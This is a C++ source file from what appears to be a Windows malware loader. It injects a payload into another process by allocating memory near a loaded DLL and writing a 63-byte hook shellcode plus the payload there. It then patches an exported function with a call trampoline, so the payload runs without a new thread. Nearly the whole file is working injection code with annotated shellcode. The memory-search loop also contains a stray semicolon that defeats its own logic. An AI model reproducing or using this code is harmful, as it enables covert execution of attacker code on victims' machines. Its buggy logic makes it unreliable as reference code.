#include "headers/payload.h"
#include "utils/headers/CRTdefs.h"
#include "API/headers/api.h"
#include "intrin.h"
#include <winternl.h>

// Locates a memory gap next to the DLL that exports the hooked function
bool LocateMemoryGap(IN HANDLE hProcess, OUT ULONG_PTR* puAddress, IN ULONG_PTR uExportedFuncAddress, IN size_t sPayloadSize)
{
	size_t sTempSize   = sPayloadSize;
	NTSTATUS status    = NULL;
	ULONG_PTR uAddress = NULL;

	auto &instance = API::APIResolver::GetInstance();
	auto api          = instance.GetAPIAccess();

	
	for (uAddress = (uExportedFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000; uAddress < uExportedFuncAddress + 0x70000000; uAddress += 0x10000) 
	{
		if (!NT_SUCCESS(status = api.func.pNtAllocateVirtualMemory(hProcess, (void**)&uAddress, 0x00, &sTempSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)));
			continue;

			*puAddress = uAddress;
			break;
	}

	return *puAddress ? true : false;
}

// This function redirects execution to the shellcode put into the memory gap, which uses a relative call instruction which requires an offset
bool InstallHook(IN HANDLE hProcess, IN void *pExportedFunc, IN void* pMainPayloadAddress) 
{
	NTSTATUS status		   = NULL;

	DWORD dwOldProtection  = NULL;
	UCHAR uTrampoline[0x5] = { 0xE8, 0x0, 0x0, 0x0, 0x0 }; // Call rva
	unsigned long uRVA     = static_cast<unsigned long>((reinterpret_cast<ULONG_PTR>(pMainPayloadAddress) - (reinterpret_cast<ULONG_PTR>(pExportedFunc) + sizeof(uTrampoline)))); // The RVA 
	
	size_t sTempSize	   = sizeof(uTrampoline); 
	size_t sBytesWritten   = NULL;

	void *pTempAddr		   = pExportedFunc;

	auto &resolver = API::APIResolver::GetInstance();
	auto api		  = resolver.GetAPIAccess();


	memcpy(&uTrampoline[1], &uRVA, sizeof(uRVA));

	// Get write access to the targeted function
	if (!NT_SUCCESS(status = api.func.pNtProtectVirtualMemory(hProcess, &pTempAddr, &sTempSize, PAGE_READWRITE, &dwOldProtection)))
		return false;

	// Patch 5 bytes of the exported function with the trampoline
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, pExportedFunc, uTrampoline, sizeof(uTrampoline), &sBytesWritten))) || sBytesWritten != sizeof(uTrampoline))
		return false;

	// Restore values
	sTempSize = sizeof(uTrampoline);
	pTempAddr = pExportedFunc;

	// Mark pExportedFunc as rwx, shellcode will restore bytes that were replaced by the trampoline
	if (!NT_SUCCESS(status = api.func.pNtProtectVirtualMemory(hProcess, &pTempAddr, &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))
		return false;


	return true;
}

/* Hook shellcode
https://defuse.ca/online-x86-assembler.htm
																	  ; Original Shellcode:
start:
	; Save the address of the hooked function to the stack
	0:  5b                      pop    rbx							; instead of 'pop rax'
	1:  48 83 eb 04             sub    rbx,0x4						; instead of 'sub rax,0x5'
	5:  48 83 eb 01             sub    rbx,0x1
	9:  53                      push   rbx							; instead of 'push rax'

	; Save the hooked function's parameters
	a:  51                      push   rcx
	b:  52                      push   rdx
	c:  41 51                   push   r9							; instead of 'push r8'
	e:  41 50                   push   r8							; instead of 'push r9'
	10: 41 53                   push   r11							; instead of 'push r10'
	12: 41 52                   push   r10							; instead of 'push r11'

	; "0xaaaaaaaaaaaaaaaa" will be patched at runtime
	; Restore the hooked function's original bytes
	14: 48 b9 aa aa aa aa aa    movabs rcx,0xaaaaaaaaaaaaaaaa			; Place holder of the original bytes of the hooked function - instead of '0x1122334455667788'    (AT BYTE NMBR: 22)
	1b: aa aa aa
	1e: 48 89 0b                mov    QWORD PTR [rbx],rcx			; instead of '[rax]'

	; Execute the main payload
	21: 48 83 ec 20             sub    rsp,0x20
	25: 48 83 ec 20             sub    rsp,0x20
	29: e8 11 00 00 00          call   3f <shellcode>
	2e: 48 83 c4 40             add    rsp,0x40

	; Restore the hooked function's parameters
	32: 41 5a                   pop    r10							; instead of 'pop r11'
	34: 41 5b                   pop    r11							; instead of 'pop r10'
	36: 41 58                   pop    r8							; instead of 'pop r9'
	38: 41 59                   pop    r9							; instead of 'pop r8'
	3a: 5a                      pop    rdx
	3b: 59                      pop    rcx

	; Pass the execution to the hooked function, that will execute normally
	3c: 5b                      pop    rbx							; instead of 'pop rax'
	3d: ff e3                   jmp    rbx							; instead of 'jmp rax'

*/

unsigned char g_HookShellCode[63] = {
	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};


void PatchHook(void *pExportedFunc) {
	// ullOriginalBytes is the first 8 bytes of the hooked function (before hooking)
	unsigned long long uOriginalBytes = *(unsigned long long*)pExportedFunc;

	// The place holder (0xaaaaaaaaaaaaaaaa) is at the 22nd byte
	memcpy(&g_HookShellCode[22], &uOriginalBytes, sizeof(uOriginalBytes));
}

bool WritePayloadBuffer(IN HANDLE hProcess, IN ULONG_PTR uAddress, IN ULONG_PTR uHookShellcode, IN size_t sHookShellcodeSize, IN ULONG_PTR uPayloadBuffer, IN size_t sPayloadSize)
{

	size_t		sTempSize = sPayloadSize;
	size_t		sBytesWritten = 0x00;
	DWORD		dwOldProtection = 0x00;
	NTSTATUS	status = NULL;

	auto& resolver = API::APIResolver::GetInstance();
	auto api = resolver.GetAPIAccess();


	// Write g_HookShellcode
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress), reinterpret_cast<void*>(uHookShellcode), sHookShellcodeSize, &sBytesWritten))) || sBytesWritten != sHookShellcodeSize) 
		return false;
	

	// Write main payload after g_HookShellcode
	if (!NT_SUCCESS((status = api.func.pNtWriteVirtualMemory(hProcess, reinterpret_cast<void*>(uAddress + sBytesWritten), reinterpret_cast<void*>(uPayloadBuffer), sPayloadSize, &sBytesWritten))) || sBytesWritten != sPayloadSize) 
		return false;
	


	if (!NT_SUCCESS((status = api.func.pNtProtectVirtualMemory(hProcess, reinterpret_cast<void**>(&uAddress), &sTempSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) 
		return false;
	

	return true;
}